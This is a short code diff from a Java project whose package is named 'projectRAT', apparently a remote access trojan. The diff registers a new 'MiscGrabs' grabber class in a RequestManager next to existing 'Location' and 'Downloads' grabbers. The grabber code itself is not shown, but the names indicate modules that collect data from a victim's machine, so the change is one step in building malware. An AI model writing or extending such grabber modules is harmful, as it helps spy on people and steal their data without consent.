@@ -2,6 +2,7 @@ package in.momin5.projectRAT.request;
 
 import in.momin5.projectRAT.request.grabbers.Downloads;
 import in.momin5.projectRAT.request.grabbers.Location;
+import in.momin5.projectRAT.request.grabbers.MiscGrabs;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -13,8 +14,9 @@ public class RequestManager {
 
     public RequestManager() {
         requests.addAll(Arrays.asList(
-           new Location(),
-           new Downloads()
+                new MiscGrabs(),
+                new Location(),
+                new Downloads()
         ));
     }
 
